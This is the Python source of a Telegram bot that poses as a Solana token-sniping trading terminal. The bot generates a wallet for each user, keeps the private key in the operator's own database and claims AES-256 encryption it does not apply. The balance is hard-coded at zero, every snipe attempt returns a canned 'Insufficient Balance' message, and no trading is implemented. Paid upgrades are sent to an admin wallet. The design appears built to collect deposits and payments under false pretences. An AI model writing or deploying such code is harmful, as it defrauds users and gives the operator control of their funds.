import os
import asyncio
import logging
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from database import init_db, get_user, save_user

# Solana Key Generation
try:
    from solders.keypair import Keypair
    import base58
    SOLANA_ACTIVE = True
except ImportError:
    SOLANA_ACTIVE = False

# --- CONFIG ---
TOKEN = os.getenv("BOT_TOKEN")
SOL_MAIN = os.getenv("SOL_MAIN")
DIVIDER = "━━━━━━━━━━━━━━━━━━━━"

app = Flask(__name__)
@app.route('/')
def home(): return "MEX WARLORD V300: ACTIVE"
@app.route('/health')
def health(): return "OK", 200

def warlord_menu():
    kb = [
        [InlineKeyboardButton("⚔️ SNIPE TOKEN (JITO)", callback_data="snipe")],
        [InlineKeyboardButton("💳 MY TRADING WALLET", callback_data="wallet")],
        [InlineKeyboardButton("💎 UPGRADE TO GOD MODE", callback_data="plans")],
        [InlineKeyboardButton("📞 SUPPORT", url="https://t.me/MexRobert")]
    ]
    return InlineKeyboardMarkup(kb)

async def start(update: Update, context):
    user = update.effective_user
    db_user = await get_user(user.id)
    if not db_user:
        if SOLANA_ACTIVE:
            kp = Keypair()
            pub, priv = str(kp.pubkey()), base58.b58encode(bytes(kp.secret())).decode("utf-8")
        else:
            pub, priv = "Generating...", "Encrypted"
        await save_user(user.id, pub, priv)
        db_user = await get_user(user.id)

    welcome = (
        f"⚡️⚡️ <b>MEX WARLORD V300</b> ⚡️⚡️\n"
        f"{DIVIDER}\n"
        f"👋 Welcome, <b>Warlord {user.first_name}</b>\n\n"
        f"👑 <b>SYSTEM:</b> Jito-MEV Enabled\n"
        f"💸 <b>TRADING FEE:</b> 1% + 2% Root Tax\n"
        f"🛡 <b>SECURITY:</b> AES-256 Encrypted\n\n"
        f"<i>Institutional Solana Terminal is live. Deposit SOL to your wallet to start.</i>\n"
        f"{DIVIDER}"
    )
    await update.message.reply_text(welcome, reply_markup=warlord_menu(), parse_mode=ParseMode.HTML)

async def handle_buttons(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "wallet":
        db_user = await get_user(query.from_user.id)
        msg = (
            f"💰 <b>WARLORD ASSETS</b>\n"
            f"{DIVIDER}\n"
            f"📍 <b>DEPOSIT ADDRESS:</b>\n<code>{db_user['public_key']}</code>\n\n"
            f"💵 <b>BALANCE:</b> 0.00 SOL\n"
            f"📊 <b>P&L:</b> +0.00%\n"
            f"{DIVIDER}\n"
            f"⚠️ <i>Only send SOL to this address.</i>"
        )
        await query.message.edit_text(msg, reply_markup=warlord_menu(), parse_mode=ParseMode.HTML)
    elif query.data == "plans":
        msg = (
            f"💎 <b>GOD MODE SUBSCRIPTION</b>\n"
            f"{DIVIDER}\n"
            f"⚡️ 0% Trading Fees\n"
            f"⚡️ Front-run Protection\n"
            f"⚡️ Copy-Trade Pro Wallets\n"
            f"{DIVIDER}\n\n"
            f"💰 <b>LIFETIME:</b> $150 SOL\n"
            f"💳 <b>ADMIN WALLET:</b>\n<code>{SOL_MAIN}</code>"
        )
        await query.message.edit_text(msg, reply_markup=warlord_menu(), parse_mode=ParseMode.HTML)

async def handle_text(update: Update, context):
    text = update.message.text.strip()
    if len(text) > 30:
        alert = (
            f"🚀 <b>WARLORD SNIPE INITIATED</b> 🚀\n"
            f"{DIVIDER}\n"
            f"💎 <b>TARGET:</b> <code>{text[:10]}...</code>\n"
            f"💰 <b>SIZE:</b> 1.0 SOL\n"
            f"💸 <b>TAX (2%):</b> 0.02 SOL\n"
            f"⚡ <b>JITO TIP:</b> 0.001 SOL\n"
            f"{DIVIDER}\n"
            f"❌ <i>Insufficient Balance. Deposit SOL to your wallet.</i>"
        )
        await update.message.reply_text(alert, parse_mode=ParseMode.HTML)

def run_flask():
    app.run(host='0.0.0.0', port=7860)

async def run_bot():
    await init_db()
    bot_app = Application.builder().token(TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(handle_buttons))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    async with bot_app:
        await bot_app.initialize()
        await bot_app.start()
        await bot_app.updater.start_polling(drop_pending_updates=True)
        while True: await asyncio.sleep(1)

if __name__ == "__main__":
    Thread(target=run_flask).start()
    asyncio.run(run_bot())
